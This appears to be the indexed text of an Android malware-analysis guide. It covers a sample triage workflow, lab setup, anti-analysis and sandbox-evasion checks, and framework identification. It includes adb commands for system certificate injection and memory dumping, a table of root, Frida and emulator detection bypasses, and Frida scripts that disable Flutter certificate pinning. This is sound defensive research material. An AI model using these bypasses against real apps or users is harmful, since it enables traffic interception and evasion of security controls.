android-security-awesome Curated list of Android security tools and resources awesome-android-security Pentester and bug bounty focused links Awesome Android Reverse Engineering RE tools and techniques Awesome-Android-Vulnerability-Research Vulnerability research focused"},{"location":"resources/#periodic-reports","title":"Periodic Reports","text":"Report Publisher Cadence Financial Threat Report Kaspersky Securelist Annual Mobile Threat Landscape 2024 Kaspersky Securelist Annual Mobile Threat Report McAfee Labs Annual Mobile Threat Statistics Q1 2025 Kaspersky Securelist Quarterly Mobile Threat Statistics Q2 2025 Kaspersky Securelist Quarterly Mobile Threat Statistics Q3 2025 Kaspersky Securelist Quarterly ESET Threat Report H1 2024 ESET Semi-annual ESET Threat Report H2 2025 ESET Semi-annual Year in Review: 0-days Google Project Zero Annual Global Mobile Threat Report Zimperium Annual Mobile Banking Heists Report Zimperium Annual Mobile Threat Intelligence Report Lookout Annual Global Threat Landscape Report Fortinet Semi-annual"},{"location":"resources/#notable-research","title":"Notable Research","text":"<p>Key technical research publications from security teams. For vendor-specific malware analysis, see individual malware family pages.</p> Research Publisher Topic A 0-click exploit chain for the Pixel 9 (3-part series) Google Project Zero Dolby decoder integer overflow + kernel driver sandbox escape. 139-day patch gap. Bad Binder: Android In-The-Wild Exploit Google Project Zero CVE-2019-2215 Binder use-after-free. Linked to NSO Group's Pegasus. In-the-Wild Series: Android Exploits Google Project Zero Chrome RCE + Android n-day privilege escalation from watering hole. Multiple Internet-to-Baseband RCE in Exynos Modems Google Project Zero 18 zero-days in Samsung Exynos modems. 4 allow RCE with just a phone number. Samsung In-the-Wild Exploit Chain Google Project Zero Logic bugs exploited against Samsung devices. CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. Analyzing a Modern In-the-Wild Android Exploit Google Project Zero CVE-2023-0266 (ALSA 0-day) + CVE-2023-26083 (Mali GPU 0-day). Commercial spyware. .NET MAUI Evasion McAfee Labs Malware using C#/.NET MAUI framework to bypass DEX-based analysis. Disclosure of 7 Android and Pixel Vulnerabilities Oversecured WebView file theft, Bluetooth permission bypass, VPN bypass, system component access. Two Weeks of Securing Samsung Devices Oversecured 60+ Samsung vulnerabilities. Path traversal via <code>Uri.getLastPathSegment()</code>, SMS database access. 20 Security Issues in Xiaomi Devices Oversecured Intent redirection, content provider, and privilege escalation in Xiaomi system apps. Exploiting Memory Corruption on Android Oversecured Native memory corruption via VirtualRefBasePtr. PayPal vulnerability example. Play Core Library Code Execution Oversecured Persistent code execution through dynamic module loading. Automated discovery. NGate: NFC Relay Attacks ESET First Android NFC relay malware. Clones payment cards via NFCGate for ATM cash withdrawal. EvilVideo: Telegram Zero-Day ESET Zero-day exploit for Telegram for Android. APKs disguised as video previews. Sold on underground forums. 525,600 Assessments: Top Mobile App Risks NowSecure 75% of apps have misconfigured crypto, 85% have SDK vulnerabilities, 1 in 5 has hardcoded keys. Dangerous Mobile App Permissions NowSecure Analysis of 378,000+ Android apps: 62% request dangerous permissions. AI-Assisted Decompilation NowSecure Using language models to optimize decompiled Android app code."},{"location":"resources/#training-platforms","title":"Training Platforms","text":"Platform Description 8kSec Battlegrounds Free mobile security challenges (CTF-style). Android challenges include deep link exploitation, client-side bypass, malicious app creation. Community writeups available. OWASP MASTG Test Apps Standardized vulnerable Android and iOS apps for practicing MASVS testing. OVAA Oversecured Vulnerable Android App. Practice exploiting common Android vulnerabilities."},{"location":"reversing/","title":"Reversing","text":"<p>Practical methodology for reversing Android applications, from initial triage to full unpacking. Each page covers the approach, tools, and target-specific techniques for defeating protections.</p>"},{"location":"reversing/#methodology","title":"Methodology","text":"Approach When to Use Static Analysis First pass on any APK: manifest review, decompilation, string extraction, identifying protections Dynamic Analysis Runtime behavior observation: tracing API calls, monitoring file/network activity, capturing decrypted payloads Hooking Intercepting and modifying function calls at runtime using Frida, Xposed, or native hooks Patching Modifying APK or DEX bytecode: disabling checks, injecting instrumentation, repackaging Network Analysis Intercepting C2 traffic: proxy setup, SSL pinning bypass, protocol identification, exfiltration channel mapping"},{"location":"reversing/#triage-workflow","title":"Triage Workflow","text":"<p>When a new sample arrives, follow this sequence to identify what you're dealing with before deep-diving:</p> <pre><code>1. Static triage\n   - File hashes (MD5, SHA-256) for VT/MalwareBazaar lookup\n   - AndroidManifest.xml: permissions, components, intent filters\n   - strings / grep for URLs, IPs, API keys, crypto constants\n   - Identify packer: check for known packer signatures (Virbox, DexGuard, Tencent Legu)\n\n2. If packed: unpack first\n   - Chinese packers: memory dump via Frida (DexClassLoader hook)\n   - DexGuard: string decryption hooks, class name deobfuscation\n   - Virbox: native unpacking from libvdog.so\n   - See Packers section for family-specific techniques\n\n3. Decompile and analyze\n   - JADX for Java/Smali, Ghidra/IDA for native libs\n   - Map class structure: identify C2 handler, command dispatcher, payload classes\n   - Extract encryption keys, C2 URLs, target app lists\n\n4. Dynamic validation\n   - Run in emulator or physical device with proxy\n   - Capture C2 registration and first beacon\n   - Trigger key behaviors: overlay injection, accessibility activation, data exfiltration\n   - Hook crypto functions to capture plaintext C2 traffic\n\n5. Network capture\n   - Set up proxy (Burp/mitmproxy) with SSL pinning bypass\n   - Map API endpoints and command protocol\n   - Identify exfiltration channels and data format\n   - Extract IOCs: domains, IPs, paths, bot IDs\n</code></pre>"},{"location":"reversing/#environment-setup","title":"Environment Setup","text":""},{"location":"reversing/#recommended-lab-configuration","title":"Recommended Lab Configuration","text":"Component Option A (Physical) Option B (Emulated) Device Rooted Pixel (Magisk) Android Studio AVD or Genymotion Android version Match target's <code>minSdkVersion</code> API 28-33 covers most samples Root Magisk + Zygisk Built-in root (AVD) Frida frida-server on device frida-server on emulator Proxy Burp Suite / mitmproxy on host Same, bridge networking Network isolation Dedicated Wi-Fi AP or VLAN NAT with host proxy <p>Physical devices are preferred for samples with emulator detection (most banking trojans). Emulators work for initial triage and samples without anti-emulation.</p>"},{"location":"reversing/#anti-analysis-checks","title":"Anti-Analysis Checks","text":"<p>Most modern banking trojans implement multiple anti-analysis checks. Know what to expect:</p> Check What It Detects Bypass Root detection Magisk, su binary, root management apps MagiskHide / Shamiko, Frida hook Emulator detection Build properties, sensors, telephony Frida property spoofing, physical device Frida detection Port 27042, process name, <code>/proc/self/maps</code> Rename binary, non-default port, Magisk module Debugger detection <code>Debug.isDebuggerConnected()</code>, TracerPid Frida hook, Smali patch VPN/proxy detection Network interface checks, proxy settings Transparent proxy via iptables Geofencing SIM country, locale, timezone, IP geolocation Frida spoof, Smali patch Google Play Services SafetyNet/Play Integrity attestation Magisk modules (Play Integrity Fix) <p>For packer-specific protections and bypass techniques, see Packers.</p>"},{"location":"reversing/#cross-references","title":"Cross-References","text":"<p>Target-specific reversing (e.g., unpacking Virbox, bypassing anti-debug) is documented in the relevant Packers and Attack Techniques pages. Individual malware family pages include reversing notes specific to each family's protections.</p>"},{"location":"reversing/dynamic-analysis/","title":"Dynamic Analysis","text":"<p>Running the app and observing its behavior at runtime. Bypasses packing and obfuscation since the code must decrypt itself to execute. Captures network traffic, API calls, file operations, and runtime behavior that static analysis cannot reveal.</p>"},{"location":"reversing/dynamic-analysis/#setup","title":"Setup","text":""},{"location":"reversing/dynamic-analysis/#environment-options","title":"Environment Options","text":"Environment Pros Cons Physical device (rooted) No emulator detection, real hardware Risk to personal data, device may get locked by ransomware Android emulator (stock) Easy to snapshot/restore, free Detected by most malware Genymotion Better hardware simulation Still detectable, commercial Custom AOSP build Can disable detection checks at framework level Complex setup <p>For malware analysis, a rooted physical device with a clean image is ideal. Use a dedicated device with no personal data.</p>"},{"location":"reversing/dynamic-analysis/#root-access","title":"Root Access","text":"<p>Root is needed for:</p> <ul> <li>Frida server execution</li> <li>Network traffic interception (iptables, cert injection)</li> <li>File system access to app private directories</li> <li>Process tracing (strace, ltrace)</li> </ul> <p>Options: Magisk (recommended, supports MagiskHide/Zygisk for detection bypass), KernelSU, or engineering builds. For emulator-based analysis, 8kSec's emulator rooting guide provides a step-by-step walkthrough using rootAVD to enable root access on Android Virtual Devices for Frida server and dynamic analysis without a physical device.</p>"},{"location":"reversing/dynamic-analysis/#network-interception","title":"Network Interception","text":"<p>Configure proxy for HTTP/HTTPS traffic:</p> <pre><code>adb shell settings put global http_proxy &lt;proxy_ip&gt;:&lt;port&gt;\n</code></pre> <p>For HTTPS, install the proxy CA certificate as a system cert (requires root on Android 7+):</p> <pre><code># Convert cert to Android format\nopenssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1\n# Result: 9a5ba575\ncp burp-ca.pem 9a5ba575.0\nadb push 9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre> <p>On Android 14+, system cert injection requires mounting the cert store differently due to read-only system partition changes.</p> <p>For apps with certificate pinning, see Hooking for Frida-based bypass.</p>"},{"location":"reversing/dynamic-analysis/#runtime-observation","title":"Runtime Observation","text":""},{"location":"reversing/dynamic-analysis/#logcat","title":"Logcat","text":"<p>Android's system log captures app output, exceptions, and system events:</p> <pre><code>adb logcat --pid=$(adb shell pidof com.target.app)\n</code></pre> <p>Filter for useful information:</p> <pre><code>adb logcat | grep -E \"(http|url|key|token|password|error|exception)\" -i\n</code></pre> <p>Malware authors often leave debug logging in release builds.</p>"},{"location":"reversing/dynamic-analysis/#process-and-file-monitoring","title":"Process and File Monitoring","text":"<pre><code># Watch file system changes\nadb shell inotifywait -m /data/data/com.target.app/\n\n# Monitor network connections\nadb shell netstat -anp | grep &lt;pid&gt;\n\n# Trace system calls\nadb shell strace -p &lt;pid&gt; -e trace=network,file\n</code></pre>"},{"location":"reversing/dynamic-analysis/#dumping-decrypted-dex","title":"Dumping Decrypted DEX","text":"<p>For packed apps, the real DEX is decrypted in memory at runtime. Capture it:</p> <p>Using Frida (see Hooking):</p> <p>Hook <code>DexFile</code> or <code>InMemoryDexClassLoader</code> to dump DEX bytes when they're loaded.</p> <p>Using /proc/maps:</p> <pre><code>adb shell su -c \"cat /proc/&lt;pid&gt;/maps\" | grep dex\nadb shell su -c \"dd if=/proc/&lt;pid&gt;/mem bs=1 skip=&lt;offset&gt; count=&lt;size&gt; of=/sdcard/dumped.dex\"\n</code></pre> <p>Using fridump or similar memory dumping tools.</p> <p>Once dumped, the DEX can be analyzed with jadx like an unpacked app.</p>"},{"location":"reversing/dynamic-analysis/#traffic-analysis","title":"Traffic Analysis","text":"<p>Beyond proxy interception:</p> <ul> <li>Wireshark/tcpdump for non-HTTP protocols</li> <li>mitmproxy for programmatic traffic manipulation</li> <li>If the app uses certificate pinning, bypass it first via Frida (see Hooking)</li> <li>Check for non-standard ports, raw socket communication, DNS-based C2</li> </ul>"},{"location":"reversing/dynamic-analysis/#anti-analysis-detection","title":"Anti-Analysis Detection","text":"<p>Malware commonly checks for analysis environments:</p> Check What It Detects <code>Build.FINGERPRINT</code> contains \"generic\" Emulator <code>/system/bin/su</code> exists Root Magisk package present Root (Magisk) Frida port 27042 open Frida server <code>/proc/self/maps</code> contains \"frida\" Frida injection <code>Settings.Global.ADB_ENABLED</code> USB debugging Low sensor count Emulator Battery always charging Emulator No SIM / IMEI all zeros Emulator <p>Bypassing these checks is covered in Hooking (return fake values) and Patching (remove checks from code).</p>"},{"location":"reversing/dynamic-analysis/#sandbox-evasion","title":"Sandbox Evasion","text":"<p>Beyond simple environment fingerprinting, malware employs behavioral evasion that specifically targets automated sandbox analysis:</p> Technique How It Works Examples Time-based delays Payload activates only after N days post-install, or sleeps for extended periods before executing malicious code Anatsa delays payload delivery until user activity is detected Interaction gating Requires real user gestures (taps, scrolls, swipes) before triggering malicious behavior; sandbox bots rarely generate realistic touch events Overlay injection only activates after detecting scroll events on a target banking app Network environment checks Validates presence of real cellular data (MCC/MNC codes), rejects Wi-Fi-only or VPN connections typical of sandboxes Checks <code>TelephonyManager.getNetworkOperator()</code> for valid carrier codes Locale and SIM validation Verifies device locale, timezone, SIM operator, and country code match a target region before activating MoqHao targets specific country codes; deactivates outside target regions Installed app enumeration Checks for specific banking or financial apps before deploying overlays; sandboxes rarely have these installed Calls <code>PackageManager.getInstalledPackages()</code> looking for target apps from its overlay list Sensor validation Reads accelerometer, gyroscope, or GPS data to confirm a real device with physical movement Checks <code>SensorManager</code> for realistic sensor event streams that emulators cannot produce <p>Countering sandbox evasion during analysis: use a physical device with a real SIM card in the target region, install target banking apps (empty accounts), interact naturally with the device, and set the system clock forward if time-based delays are suspected.</p>"},{"location":"reversing/dynamic-analysis/#api-monitoring","title":"API Monitoring","text":"<p>Key Android APIs to monitor during dynamic analysis, grouped by the capability they indicate:</p> API Capability What to Watch For <code>ContentResolver.query()</code> on contacts/SMS/call log URIs Data theft Bulk reads of <code>content://sms</code>, <code>content://contacts</code>, <code>content://call_log</code> <code>MediaRecorder</code> / <code>MediaProjection</code> Screen recording <code>createVirtualDisplay()</code> calls, screen capture buffer access <code>Camera</code> / <code>AudioRecord</code> Surveillance Camera preview callbacks, audio buffer reads without visible UI <code>PackageManager.getInstalledPackages()</code> Target app enumeration Iterating installed packages to match against overlay target lists <code>AccessibilityService</code> callbacks Device control <code>onAccessibilityEvent()</code> handling, <code>performAction()</code> calls for automated clicks/input <code>Socket</code> / <code>HttpURLConnection</code> / <code>OkHttpClient</code> C2 communication Outbound connections, request/response bodies, custom headers <code>TelephonyManager</code> methods Device fingerprinting IMEI, phone number, SIM operator, network operator reads <code>KeyStore</code> / <code>Cipher</code> Cryptographic operations Key generation, encryption/decryption of C2 payloads or stolen data <code>Runtime.exec()</code> / <code>ProcessBuilder</code> Command execution Shell commands for root checks, data exfiltration, or persistence <code>DexClassLoader</code> / <code>InMemoryDexClassLoader</code> Dynamic code loading Loading decrypted DEX payloads at runtime; dump the bytes passed to these constructors <p>Hook these APIs with Frida (see Hooking) to build a behavioral profile of the sample without relying on network traffic alone.</p>"},{"location":"reversing/dynamic-analysis/#instruction-level-tracing","title":"Instruction-Level Tracing","text":"<p>For heavily obfuscated native code (e.g., Mandrake's OLLVM-protected libraries), function-level hooking may not be sufficient. Frida's Stalker API enables instruction-level tracing, observing every instruction as it executes in real time. This is the most powerful dynamic analysis technique for understanding native control flow in obfuscated samples.</p>"},{"location":"reversing/dynamic-analysis/#ai-assisted-decompilation","title":"AI-Assisted Decompilation","text":"<p>NowSecure's research on AI-assisted decompilation explores using language models to recover and optimize decompiled code, transforming jadx output into more readable and analyzable form. This is particularly useful for large-scale analysis where manual code review is impractical.</p>"},{"location":"reversing/dynamic-analysis/#family-specific-analysis-notes","title":"Family-Specific Analysis Notes","text":"<p>Certain malware families require specific dynamic analysis approaches due to their anti-analysis techniques:</p> Family Challenge Approach Mandrake OLLVM-obfuscated native libs Frida Stalker instruction tracing on libapp.so SoumniBot Malformed manifest crashes tools Use aapt2 dump instead of apktool, or pull manifest from running process GodFather v3 $JADXBLOCK anti-decompilation + virtualization Must use dynamic analysis exclusively; hook VirtualApp framework APIs Necro Steganographic payload in PNG Monitor network for image downloads, hook BitmapFactory to capture pixel extraction Klopatra Virbox packer Dump DEX from memory after Virbox unpacker runs; hook DexClassLoader Chameleon Disables biometric auth Monitor BiometricPrompt API calls, observe settings changes FluBot DGA-based C2 Capture DNS requests to observe domain generation; hook network resolution Hook VNC-like screen streaming Capture MediaProjection API usage, observe screen buffer access Octo DGA + remote access Observe AccessibilityService events, capture screen streaming buffers NGate NFC relay Monitor NFC adapter API calls, capture relayed card data in transit Cerberus lineage AES-encrypted C2 traffic Hook <code>Cipher.doFinal</code> to capture plaintext request/response bodies before encryption Anatsa Multi-stage dropper with delayed payload delivery Payload triggers only after user activity (scrolls, gestures); automate interaction or patch delay checks SharkBot DGA for C2 resolution Extract the domain generation algorithm and predict domains; hook DNS resolution to capture generated names Vultur AlphaVNC-based screen streaming Monitor VNC initialization and <code>MediaProjection</code> setup; capture VNC handshake traffic SpyNote Raw TCP socket protocol for C2 Capture with <code>tcpdump</code> since proxy tools miss non-HTTP traffic; decode custom binary protocol Gigabud Virbox-packed, core logic in native <code>libstrategy.so</code> Hook native JNI calls from <code>libstrategy.so</code>; trace command dispatch after Virbox unpacking MoqHao Auto-execution on install, no user interaction needed Malware activates immediately via broadcast receivers; capture initial C2 beacon within seconds of install"},{"location":"reversing/dynamic-analysis/#c2-protocol-identification","title":"C2 Protocol Identification","text":"<p>During traffic analysis, identify the C2 protocol to classify the family:</p> Protocol Families HTTP/HTTPS REST Most banking trojans (Cerberus, Anubis, GodFather) WebSocket TsarBot, PJobRAT MQTT Copybara Raw TCP Albiriox (unencrypted) Firebase Cloud Messaging Vultur v2, KoSpy Firebase Firestore KoSpy (config delivery) Telegram Bot API Various (dead drop resolver) TOR Hydra"},{"location":"reversing/dynamic-analysis/#tools","title":"Tools","text":"Tool Purpose Burp Suite HTTP/HTTPS proxy, traffic interception mitmproxy Scriptable HTTPS proxy Wireshark Packet capture and analysis Frida Runtime instrumentation (see Hooking) strace System call tracing Magisk Root management with detection bypass frida-dexdump Dump DEX files from memory medusa Extensible Frida-powered framework for dynamic analysis house Runtime mobile application analysis toolkit"},{"location":"reversing/frameworks/","title":"Development Frameworks","text":"<p>Identifying which development framework built an Android app determines the entire reverse engineering approach. Each framework stores code in different formats, requires different decompilation tools, and presents different hooking surfaces. An app built with Flutter has zero useful DEX code; a Cordova app has all its logic in plaintext JavaScript. Misidentifying the framework wastes hours applying the wrong toolchain.</p>"},{"location":"reversing/frameworks/#framework-identification","title":"Framework Identification","text":"<p>The fastest way to identify a framework is to unzip the APK and check for indicator files and native libraries.</p> Framework File Indicators Native Libraries Package/Class Markers React Native <code>assets/index.android.bundle</code> <code>libjsc.so</code> (JavaScriptCore) or <code>libhermes.so</code> (Hermes) <code>com.facebook.react.*</code> classes in DEX Flutter <code>assets/flutter_assets/kernel_blob.bin</code> (debug) <code>libflutter.so</code>, <code>libapp.so</code> <code>io.flutter.*</code> in DEX (thin bootstrap only) Xamarin <code>assemblies/*.dll</code> in APK root or <code>assets/</code> <code>libmonosgen-2.0.so</code>, <code>libxamarin-app.so</code> <code>mono.MonoRuntimeProvider</code> in DEX Cordova / Ionic <code>assets/www/index.html</code>, <code>assets/www/cordova.js</code> None framework-specific <code>org.apache.cordova.*</code> classes Capacitor <code>assets/public/index.html</code> None framework-specific <code>com.getcapacitor.*</code> classes Unity (Mono) <code>assets/bin/Data/Managed/*.dll</code> <code>libmono.so</code>, <code>libunity.so</code> <code>com.unity3d.player.UnityPlayer</code> Unity (IL2CPP) <code>assets/bin/Data/Managed/Metadata/global-metadata.dat</code> <code>libil2cpp.so</code>, <code>libunity.so</code> <code>com.unity3d.player.UnityPlayer</code> NativeScript <code>assets/app/bundle.js</code> or <code>assets/app/*.js</code> <code>libNativeScript.so</code> <code>org.nativescript.*</code> classes Kotlin Multiplatform No unique file indicators None framework-specific Standard Kotlin classes in DEX, shared module naming patterns Qt for Android <code>assets/--Updated-files/</code> or <code>assets/*.rcc</code> <code>libQt5Core_*.so</code>, <code>libQt6Core_*.so</code> <code>org.qtproject.qt5.*</code> or <code>org.qtproject.qt.*</code> Corona / Solar2D <code>assets/resource.car</code> <code>libcorona.so</code>, <code>liblua.so</code> <code>com.ansca.corona.*</code> classes Cocos2d-x <code>assets/res/</code>, <code>assets/src/*.lua</code> or <code>assets/script/</code> <code>libcocos2dlua.so</code> or <code>libcocos2djs.so</code> <code>org.cocos2dx.*</code> classes"},{"location":"reversing/frameworks/#framework-detection-script","title":"Framework Detection Script","text":"<p>Shell-based detection by examining APK contents:</p> <pre><code>unzip -l target.apk &gt; /tmp/apk_contents.txt\n\nif grep -q \"assets/index.android.bundle\" /tmp/apk_contents.txt; then\n    if grep -q \"libhermes.so\" /tmp/apk_contents.txt; then\n        echo \"React Native (Hermes engine)\"\n    else\n        echo \"React Native (JavaScriptCore)\"\n    fi\nelif grep -q \"libflutter.so\" /tmp/apk_contents.txt; then\n    echo \"Flutter\"\nelif grep -q \"assemblies/\" /tmp/apk_contents.txt; then\n    echo \"Xamarin / .NET MAUI\"\nelif grep -q \"assets/www/cordova.js\" /tmp/apk_contents.txt; then\n    echo \"Cordova / Ionic\"\nelif grep -q \"assets/public/index.html\" /tmp/apk_contents.txt; then\n    echo \"Capacitor\"\nelif grep -q \"libil2cpp.so\" /tmp/apk_contents.txt; then\n    echo \"Unity (IL2CPP)\"\nelif grep -q \"libmono.so\" /tmp/apk_contents.txt &amp;&amp; grep -q \"libunity.so\" /tmp/apk_contents.txt; then\n    echo \"Unity (Mono)\"\nelif grep -q \"libNativeScript.so\" /tmp/apk_contents.txt; then\n    echo \"NativeScript\"\nelif grep -q \"libQt5Core\" /tmp/apk_contents.txt || grep -q \"libQt6Core\" /tmp/apk_contents.txt; then\n    echo \"Qt for Android\"\nelif grep -q \"libcorona.so\" /tmp/apk_contents.txt; then\n    echo \"Corona / Solar2D\"\nelif grep -q \"libcocos2d\" /tmp/apk_contents.txt; then\n    echo \"Cocos2d-x\"\nelse\n    echo \"Native Android (Java/Kotlin)\"\nfi\n</code></pre> <p>Frida-based runtime detection:</p> <pre><code>Java.perform(function() {\n    var dominated = false;\n\n    try {\n        Java.use(\"com.facebook.react.ReactActivity\");\n        send(\"Framework: React Native\");\n        dominated = true;\n    } catch(e) {}\n\n    try {\n        Java.use(\"io.flutter.embedding.engine.FlutterEngine\");\n        send(\"Framework: Flutter\");\n        dominated = true;\n    } catch(e) {}\n\n    try {\n        Java.use(\"mono.MonoRuntimeProvider\");\n        send(\"Framework: Xamarin\");\n        dominated = true;\n    } catch(e) {}\n\n    try {\n        Java.use(\"org.apache.cordova.CordovaActivity\");\n        send(\"Framework: Cordova\");\n        dominated = true;\n    } catch(e) {}\n\n    try {\n        Java.use(\"com.unity3d.player.UnityPlayer\");\n        send(\"Framework: Unity\");\n        dominated = true;\n    } catch(e) {}\n\n    if (!dominated) {\n        send(\"Framework: Native Android\");\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/#framework-specific-analysis","title":"Framework-Specific Analysis","text":""},{"location":"reversing/frameworks/#react-native","title":"React Native","text":"<p>Architecture: JavaScript bundle (<code>assets/index.android.bundle</code>) executes on either JavaScriptCore (JSC) or the Hermes engine. The DEX layer contains only the React Native bridge and native module registrations. All business logic lives in JavaScript.</p> <p>Identifying the JS engine:</p> Engine Indicator Bundle Format Hermes <code>libhermes.so</code> in <code>lib/</code> Binary <code>.hbc</code> (Hermes bytecode) JavaScriptCore <code>libjsc.so</code> in <code>lib/</code> Plain JavaScript (minified) <p>Hermes bytecode analysis:</p> <p>Hermes compiles JavaScript to <code>.hbc</code> bytecode for faster startup. The bundle at <code>assets/index.android.bundle</code> contains a Hermes binary header (magic bytes <code>c6 1f bc 03</code>). Tools for decompilation:</p> Tool Purpose hbctool Disassemble/reassemble Hermes bytecode hermes-dec Decompile Hermes bytecode back to readable JavaScript jadx Useless for app logic -- only shows bridge code <p>Non-Hermes (JSC) analysis:</p> <p>The bundle is standard JavaScript, possibly minified with Metro bundler. Extract and beautify:</p> <pre><code>unzip -o target.apk assets/index.android.bundle -d /tmp/\nnpx js-beautify /tmp/assets/index.android.bundle &gt; /tmp/bundle_readable.js\n</code></pre> <p>Search the beautified bundle for API endpoints, hardcoded secrets, and authentication logic. The entire application state machine is in this single file.</p> <p>Obfuscation: Jscrambler is the most common commercial obfuscator for React Native bundles. It applies control flow flattening, string encoding, and dead code injection to the JavaScript. Metro's built-in minification only removes whitespace and shortens variable names.</p> <p>Hooking strategy:</p> <p>Standard Frida Java hooks only reach the bridge layer, not the application logic. For Hermes apps, hook the native Hermes runtime functions:</p> <pre><code>var hermesInternal = Module.findExportByName(\"libhermes.so\", \"_ZN8facebook6hermes15HermesRuntimeD1Ev\");\nif (hermesInternal) {\n    send(\"Hermes runtime detected\");\n}\n\nInterceptor.attach(Module.findExportByName(\"libhermes.so\", \"nativeCallSyncHook\"), {\n    onEnter: function(args) {\n        send(\"Native bridge call intercepted\");\n    }\n});\n</code></pre> <p>SSL pinning bypass: If the app uses <code>react-native-ssl-pinning</code> or a custom native TrustManager, standard Java-layer OkHttp hooks work. If pinning is implemented in the JavaScript layer via a custom fetch wrapper, patch the bundle directly or hook the native HTTP module.</p> <p>Malware context: React Native enables rapid cross-platform deployment of phishing apps. Threat actors build a single phishing interface and deploy to both Android and iOS simultaneously. The JS bundle often contains hardcoded C2 URLs and phishing target lists.</p>"},{"location":"reversing/frameworks/#flutter","title":"Flutter","text":"<p>Architecture: Dart source compiles ahead-of-time (AOT) to native ARM machine code, stored in <code>libapp.so</code>. The Flutter engine (<code>libflutter.so</code>) provides the runtime. Zero application logic exists in the DEX layer -- the DEX code is a thin Kotlin/Java wrapper that bootstraps the Flutter engine.</p> <p>Build modes and their artifacts:</p> Mode <code>libapp.so</code> <code>kernel_blob.bin</code> Reversibility Debug Not present Present (Dart kernel snapshot) Easier -- snapshot contains type info Profile AOT snapshot Not present Moderate Release AOT snapshot (stripped) Not present Hardest -- symbols stripped <p>Toolchain:</p> Tool Purpose blutter Best current tool. Parses Dart AOT snapshots, recovers class/method names, field types, and string references from <code>libapp.so</code> reFlutter Patches <code>libflutter.so</code> to enable SSL traffic interception and snapshot extraction Doldrums Older Dart snapshot parser, supports limited Dart SDK versions <p>Analysis workflow:</p> <ol> <li>Extract <code>libapp.so</code> and <code>libflutter.so</code> from the APK</li> <li>Determine the Dart SDK version from <code>libflutter.so</code> strings (search for <code>Dart SDK version:</code>)</li> <li>Run blutter against <code>libapp.so</code> with the matching SDK version</li> <li>blutter outputs recovered class hierarchies, method signatures with offsets, and string literals</li> <li>Import blutter's output into Ghidra/IDA to annotate the native binary with Dart symbol names</li> </ol> <p>SSL pinning bypass: Flutter does not use the Android system certificate store. It bundles BoringSSL directly into <code>libflutter.so</code> and performs certificate verification internally. Standard Java-layer Frida hooks have zero effect. Bypass methods:</p> Method Approach reFlutter Patches <code>ssl_crypto_x509_session_verify_cert_chain</code> in <code>libflutter.so</code> to always return valid Binary patch Use Ghidra to locate the verification function in <code>libflutter.so</code> and NOP out the check Frida native hook Hook the BoringSSL verification function at runtime <pre><code>var flutter = Module.findBaseAddress(\"libflutter.so\");\nvar verify = Module.findExportByName(\"libflutter.so\", \"ssl_crypto_x509_session_verify_cert_chain\");\nif (verify) {\n    Interceptor.replace(verify, new NativeCallback(function() {\n        return 1;\n    }, \"int\", []));\n}\n</code></pre> <p>Hooking Dart functions: Since Dart compiles to native code, hooking requires targeting native function addresses extracted by blutter:</p> <pre><code>var libapp = Module.findBaseAddress(\"libapp.so\");\nvar targetMethodOffset = 0x1a3f40;\nInterceptor.attach(libapp.add(targetMethodOffset), {\n    onEnter: function(args) {\n        send(\"Dart method called at offset \" + targetMethodOffset.toString(16));\n    }\n});\n</code></pre> <p>Malware context: FluHorse is the primary Flutter-based malware family. It targets banking credentials by mimicking legitimate financial apps. The Dart AOT compilation provides inherent obfuscation since standard Android RE tools (jadx, apktool) produce no useful output.</p>"},{"location":"reversing/frameworks/#xamarin","title":"Xamarin","text":"<p>Architecture: C# source compiles to Common Intermediate Language (IL) and runs on the Mono runtime (Xamarin classic) or is AOT-compiled (.NET MAUI). Two distinct modes require different analysis approaches.</p> <p>Mono mode (assemblies visible):</p> <p>The APK contains <code>assemblies/*.dll</code> files with standard .NET IL code. These DLLs decompile to near-source-quality C# using .NET decompilers:</p> Tool Purpose dnSpy .NET debugger and decompiler, best for interactive analysis ILSpy Open-source .NET decompiler dotPeek JetBrains .NET decompiler <pre><code>unzip target.apk assemblies/* -d /tmp/xamarin_out/\n</code></pre> <p>Open the extracted DLLs in dnSpy. The decompiled C# is typically cleaner than jadx output from DEX, with full type information, method signatures, and string literals preserved.</p> <p>AOT mode (.NET MAUI):</p> <p>Newer .NET MAUI apps may AOT-compile assemblies into native code, eliminating the readable IL. In this case, the <code>assemblies/</code> directory contains stripped binaries or blob files that resist standard decompilation. McAfee documented malware using this technique to evade detection, with additional XOR and AES encryption layers on the payloads.</p> <p>SSL pinning bypass:</p> <pre><code>Java.perform(function() {\n    var ServerCertificateValidation = Java.use(\"Mono.Net.Security.MobileTlsProvider\");\n    if (ServerCertificateValidation) {\n        send(\"Xamarin Mono TLS provider found\");\n    }\n});\n</code></pre> <p>For Mono-mode apps, the most effective approach is to patch the DLL directly: decompile with dnSpy, modify the certificate validation callback to always return <code>true</code>, save the modified DLL, repackage the APK.</p> <p>Hooking: Frida can hook Mono runtime internals:</p> <pre><code>var monoJitRuntimeInvoke = Module.findExportByName(\"libmonosgen-2.0.so\", \"mono_jit_runtime_invoke\");\nif (monoJitRuntimeInvoke) {\n    Interceptor.attach(monoJitRuntimeInvoke, {\n        onEnter: function(args) {\n            var methodName = Memory.readUtf8String(Memory.readPointer(args[0].add(8)));\n            send(\"Mono invoke: \" + methodName);\n        }\n    });\n}\n</code></pre> <p>Where to look: Ignore the DEX entirely. All application logic is in <code>assemblies/*.dll</code>. The DEX contains only the Mono runtime bootstrap and Android activity stubs.</p>"},{"location":"reversing/frameworks/#cordova-ionic-capacitor","title":"Cordova / Ionic / Capacitor","text":"<p>Architecture: Standard web application (HTML, CSS, JavaScript) running inside an Android WebView. Native device APIs are accessed through JavaScript bridge plugins.</p> <p>Code location: All application logic lives in <code>assets/www/</code> (Cordova/Ionic) or <code>assets/public/</code> (Capacitor). Unzip the APK and the entire application source is readable:</p> <pre><code>unzip target.apk assets/www/* -d /tmp/cordova_out/\n</code></pre> <p>Analysis: Open <code>index.html</code> in a browser or text editor. JavaScript files are typically minified but not compiled. Apply <code>js-beautify</code> or use browser dev tools to read the code. Search for:</p> <ul> <li>API endpoints and C2 URLs</li> <li>Hardcoded credentials and tokens</li> <li>Data exfiltration logic</li> <li>Plugin bridge calls to native functionality</li> </ul> <p>Plugin analysis: Cordova plugins bridge JavaScript to native Android APIs. Examine <code>plugins/</code> for installed plugins and their Java implementations:</p> Plugin 